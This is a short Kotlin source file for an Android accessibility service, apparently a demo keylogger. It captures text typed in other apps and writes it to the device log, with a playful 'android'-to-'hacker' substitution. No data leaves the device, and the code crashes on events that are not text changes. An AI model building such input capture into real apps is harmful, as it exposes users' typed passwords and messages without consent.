package com.example.keystrokelistener

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent


class KeyStrokeListener : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        var eventText: String? = null
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "KeyStrokes: "
        }
        eventText = eventText!! + event.text
        if (eventText.contains("android"))
            Log.d("ACCESSIBILITY SERVICE:", " ${eventText.replace("android", "hacker")}")
        //Log.d("ACCESSIBILITY SERVICE:", " $eventText")
    }
    override fun onInterrupt() {}
}